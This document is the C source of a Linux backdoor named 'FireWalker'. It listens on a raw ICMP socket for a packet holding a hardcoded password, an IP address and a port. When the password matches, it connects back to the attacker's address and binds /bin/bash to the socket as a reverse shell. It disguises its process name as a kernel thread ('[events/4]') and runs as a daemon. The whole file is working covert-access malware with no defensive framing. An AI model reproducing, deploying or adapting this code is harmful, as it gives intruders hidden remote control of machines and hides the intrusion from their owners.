#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>



#define STDIN 0
#define STDOUT 1
#define STERR 2
#define MAXLINE 4096
#define PASSLEN 8


// password
#define PASS "fwalk"
// Name of the process in /bin/ps output.
#define HIDE "[events/4]"


// GLOBALS
int sockfd;
int ready;
void (*logger)(int, const char *, ...);
char password[] = PASS;

struct icmp_payload {
    char pass[PASSLEN];
    struct in_addr addr;
    int port;
} *icmpdata;



// PROTOTYPES
int process_packet(void);
char * sock_to_host(const struct sockaddr *, socklen_t);
void launch_shell(const char *, int);
static void sigchld_hdlr(int );



int main(int argc, char *argv[])
{

    char *IDENT = "FireWalker";
    fd_set allset, rset;
    struct sigaction signal;


    // Hide process name in ps list
    strcpy(argv[0], HIDE);

    // Daemonize
    if ((daemon(0, 0) < 0))
        exit(1);

    logger = syslog;
    openlog(IDENT, LOG_CONS | LOG_PID, LOG_DAEMON);

    memset(&signal, 0, sizeof(signal));
    signal.sa_handler = sigchld_hdlr;

    if(sigaction(SIGCHLD, &signal, 0)) {
        logger(LOG_ERR, "Error creating SIGCHLD hanlder, %m");
        exit(1);
    }

    if ( (sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0 ) {
        logger(LOG_ERR, "Failed to create socket: %m");
        exit(1);
    }
    logger(LOG_INFO, "Successfully created socket: %d: %m", sockfd);

    FD_ZERO(&allset);
    FD_SET(sockfd, &allset);

    for (; ;) {
        rset = allset;
        ready = select(sockfd+1, &rset, NULL, NULL, NULL);

        if (FD_ISSET(sockfd, &rset))
            if (process_packet() <= 0)
                continue;
    }
    exit(0);
}


int process_packet(void) 
{
    //char rbuf[sizeof(struct iphdr) + sizeof(struct icmp)];
    int i, hlen1, hlen2, icmplen, sport;
    char buf[MAXLINE];
    char *addr;
    ssize_t n;
    socklen_t len;
    struct ip *ip, *hip;
    struct icmp *icmp;
    struct sockaddr_in from, dest;
    //struct icmpd_err icmpd_err;

    logger = syslog;
    len = sizeof(from);

    //logger(LOG_INFO, "Reading from socket...");
    n = recvfrom(sockfd, buf, MAXLINE, 0, (struct sockaddr*) &from, &len);
    //logger(LOG_INFO, "recvfrom(), %d: %m", n);
    logger(LOG_INFO, "%d bytes ICMPv4 from %s:",
            n, sock_to_host((struct sockaddr*) &from, len));

    ip = (struct ip *) buf;
    hlen1 = ip->ip_hl << 2; /* length of IP header */

    icmp = (struct icmp *) (buf + hlen1); /* start of ICMP header */
    if ( (icmplen = n - hlen1) < 8) {
        logger(LOG_ERR, "Malformed ICMP packet. Length: %d < 8", icmplen);
        exit(1);
    }
    
    logger(LOG_INFO, "type = %d, code = %d\n", icmp->icmp_type,
            icmp->icmp_code); 

    icmpdata = (struct icmp_payload *) icmp->icmp_data;
    addr = inet_ntoa(icmpdata->addr);
    logger(LOG_INFO, "Password = %s", icmpdata->pass);

    if ( (strcmp(icmpdata->pass, password)) == 0) {
        logger(LOG_INFO, "Passwords match!");
        launch_shell(addr, icmpdata->port);
    }
    else {
        logger(LOG_INFO, "Passwords DO NOT match!");
    }
  
    return(0);
} 


//
// Function: sigchld_hdlr
//
// SIGCHLD signal handler
//
static void sigchld_hdlr(int sig)
{
    while (waitpid(-1, NULL, WNOHANG) > 0) {
    }
}

//
// Function: sock_to_host
//
// Returns a string containing the IP address from a
// socket address structure.
//
char * sock_to_host(const struct sockaddr *sa, socklen_t salen)
{
    static char str[128];
    if (sa->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *) sa;
        if (inet_ntop(AF_INET, &sin->sin_addr, str, sizeof(str)) == NULL)
            return(NULL);
        return(str);
    }

    return(NULL);
}

//
// Function: launch_shell
//
// Forks a child that connects to the Shell IP:PORT and starts a shell
//
void launch_shell(const char *addr, int port)
{
    pid_t pid;

    if ((pid = fork()) < 0) {
        logger(LOG_ERR, "Fork failed, %m");
        exit(1);
    }

    if (pid == 0) {

        int sockfd;
        int r1, r2, r3;
        struct sockaddr_in servaddr;
        
        logger = syslog;
        logger(LOG_INFO, "Launching the shell connection!");
        logger(LOG_INFO, "Shell IP = %s\n", addr);
        logger(LOG_INFO, "Shell Port = %d\n", port);

        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
            logger(LOG_INFO, "Failed to open connecting socket!, %m");
            exit(1);
        }

        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port);
        if ( (inet_pton(AF_INET, addr, &servaddr.sin_addr) < 0 )) {
            logger(LOG_ERR, "inet_pton error, %m");
            exit(1);
        }

        if ((connect(sockfd, (struct sockaddr*) &servaddr, sizeof(servaddr))) < 0) {
            logger(LOG_ERR, "Shell connect back failed!, %m");
            exit(1);
        }

        close(STDIN);
        close(STDOUT);
        r1 = dup2(sockfd, STDIN);
        r2 = dup2(sockfd, STDOUT);
        r3 = dup2(sockfd, STERR);

        if ( r1 == -1 || r2 == -1 || r3 == -1) {
            logger(LOG_ERR, "dup2 failure, %m");
            exit(1);
        }

        execl("/bin/bash", "bash", (char *)0);
    }

}
